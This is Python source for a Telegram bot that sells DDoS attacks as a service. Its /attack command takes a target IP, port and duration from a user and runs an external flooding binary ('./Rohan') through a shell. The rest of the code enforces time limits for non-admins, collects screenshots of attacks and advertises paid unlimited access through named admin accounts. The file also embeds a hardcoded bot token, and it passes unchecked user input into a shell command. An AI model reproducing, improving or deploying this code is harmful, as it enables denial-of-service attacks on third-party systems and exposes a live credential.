#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
import logging
import os
import signal

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot configuration
BOT_USERNAME = "@Devil_FATHER_DDOS_BoT"
bot = telebot.TeleBot('7576183544:AAFbwSF8YrBQG2IjJYsv4VjA_PBiXm6x040')
ADMIN_IDS = {"1866961136", "1807014348"}
CONTACT_ADMINS = ["@Rohan2349", "@Sadiq9869"]

# Constants
MAX_DURATION = 180

# Data storage
USER_FILE = "users.txt"
FEEDBACK_FILE = "feedback_photos.txt"
FEEDBACK_LOG_FILE = "feedback_log.txt"

# Global variables
user_data = {}
active_attacks = {}
feedback_photo_ids = set()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, _, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'last_reset': datetime.datetime.fromisoformat(last_reset)
                }
    except FileNotFoundError:
        pass

def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},0,{data['last_reset'].isoformat()}\n")

def load_feedback_photos():
    try:
        with open(FEEDBACK_FILE, "r") as file:
            for line in file:
                feedback_photo_ids.add(line.strip())
    except FileNotFoundError:
        pass

def save_feedback_photo(photo_id, user_id):
    timestamp = datetime.datetime.now().isoformat()
    with open(FEEDBACK_FILE, "a") as file:
        file.write(f"{photo_id}\n")
    with open(FEEDBACK_LOG_FILE, "a") as file:
        file.write(f"{timestamp},{user_id},{photo_id}\n")
    feedback_photo_ids.add(photo_id)

@bot.message_handler(commands=['contact'])
def handle_contact(message):
    user_id = str(message.from_user.id)
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 This command can only be used in private DM!")
        return
    contact_text = f"""
📞 **Need Help or Want Premium Access?**  
🔥 Contact our admins:  
👤 {CONTACT_ADMINS[0]}  
👤 {CONTACT_ADMINS[1]}  
💎 DM to buy paid bot access for unlimited attacks!
"""
    bot.reply_to(message, contact_text)

@bot.message_handler(commands=['help'])
def handle_help(message):
    user_id = str(message.from_user.id)
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 This command can only be used in private DM!")
        return
    help_text = """
🌟 **DDOS Bot Commands** 🌟
/attack <IP> <PORT> <TIME> - Start an attack
/contact - Get help or buy premium
📸 Share a screenshot after attack to support the community!
💎 Buy unlimited attacks from @Rohan2349/@Sadiq9869
"""
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    is_admin = user_id in ADMIN_IDS
    command = message.text.split()

    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 This command can only be used in private DM!")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ Usage: /attack <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]
    try:
        port = int(port)
        time_duration = int(time_duration)
        if not is_admin and time_duration > MAX_DURATION:
            bot.reply_to(message, f"🚫 Max duration for non-admins: {MAX_DURATION}s")
            return
        if time_duration <= 0:
            bot.reply_to(message, "❌ Duration must be positive!")
            return
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be integers!")
        return

    profile_photos = bot.get_user_profile_photos(user_id)
    profile_pic = profile_photos.photos[0][-1].file_id if profile_photos.total_count > 0 else None
    
    if not profile_pic:
        bot.reply_to(message, "❌ Set a profile picture!")
        return

    if user_id in active_attacks:
        bot.reply_to(message, "⚠️ Attack in progress!")
        return

    attack_start_msg = (
        f"👤 User: @{user_name}\n"
        f"💥 Attack Started!\n"
        f"🎯 Target: {target}:{port}\n"
        f"⏳ Duration: {time_duration}s\n"
        f"📸 Share a screenshot to support the community!"
    )
    
    sent_message = bot.send_photo(message.chat.id, profile_pic, caption=attack_start_msg)
    logger.info(f"Attack started by {user_id}: {target}:{port} for {time_duration}s")

    def update_countdown(msg_id, chat_id, duration):
        remaining_time = duration
        while remaining_time >= 0 and user_id in active_attacks:
            updated_msg = (
                f"👤 User: @{user_name}\n"
                f"💥 Attack Started!\n"
                f"🎯 Target: {target}:{port}\n"
                f"⏳ Duration: {remaining_time}s\n"
                f"📸 Share a screenshot to support the community!"
            )
            try:
                bot.edit_message_caption(chat_id=chat_id, message_id=msg_id, caption=updated_msg)
            except Exception as e:
                logger.error(f"Failed to update countdown: {e}")
                break
            time.sleep(1)
            remaining_time -= 1

    countdown_thread = threading.Thread(target=update_countdown, 
                                       args=(sent_message.message_id, message.chat.id, time_duration))
    countdown_thread.start()

    full_command = f"./Rohan {target} {port} {time_duration} 512 800"
    try:
        attack_process = subprocess.Popen(full_command, shell=True, preexec_fn=os.setsid)
        active_attacks[user_id] = attack_process
        
        attack_process.wait()
        
        if user_id in active_attacks:
            bot.send_message(message.chat.id, 
                           f"✅ Attack Complete!\n🎯 {target}:{port}\n⏳ {time_duration}s")
            logger.info(f"Attack completed by {user_id}: {target}:{port}")
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ Error: {e}")
        logger.error(f"Attack failed by {user_id}: {e}")
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 This command can only be used in private DM!")
        return
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "👑 Admin feedback not required!")
        return

    photo_file_unique_id = message.photo[-1].file_unique_id
    user_data.setdefault(user_id, {'last_reset': datetime.datetime.now()})
    
    if photo_file_unique_id in feedback_photo_ids:
        bot.reply_to(message, 
                     f"⚠️ **WARNING: Duplicate Screenshot Detected!**\n"
                     f"📸 This photo was submitted before.\n"
                     f"ℹ️ Please submit a new screenshot next time!")
        return

    save_feedback_photo(photo_file_unique_id, user_id)
    
    bot.reply_to(message, 
                 f"✅ Feedback accepted!\n"
                 f"📸 Thank you for supporting the community!")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.from_user.id)
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 This command can only be used in private DM!")
        return
    user_name = message.from_user.first_name
    response = (
        "🌌 *Welcome to the Elite DDOS Network, {}!* 🌌\n"
        "══════════════════════════════════\n"
        "🚀 *World’s Most Advanced DDOS Bot* 🚀\n"
        "Experience cutting-edge technology with unparalleled power and precision.\n"
        "Join the elite and dominate the digital frontier!\n\n"
        "🔥 *Why Choose Us?* 🔥\n"
        "✨ *Unmatched Power*: Launch attacks with surgical accuracy.\n"
        "⚡ *Real-Time Control*: Instant feedback and seamless operation.\n"
        "💎 *Premium Access*: Unlock exclusive features with our VIP plan.\n"
        "📸 *Community-Driven*: Share your victories with screenshots.\n\n"
        "🌟 *Get Started Now* 🌟\n"
        "📞 Contact our elite admins:\n"
        "👤 [{}](https://t.me/Sadiq9869)\n"
        "👤 [{}](https://t.me/DDOS_VVIP)\n\n"
        "══════════════════════════════════\n"
        "💡 *Pro Tip*: Use /help to explore commands and unleash your potential!\n"
        "🌍 *Join the Elite. Rule the Web.*"
    ).format(
        user_name,
        CONTACT_ADMINS[0],
        CONTACT_ADMINS[1]
    )
    bot.reply_to(message, response, parse_mode='MarkdownV2')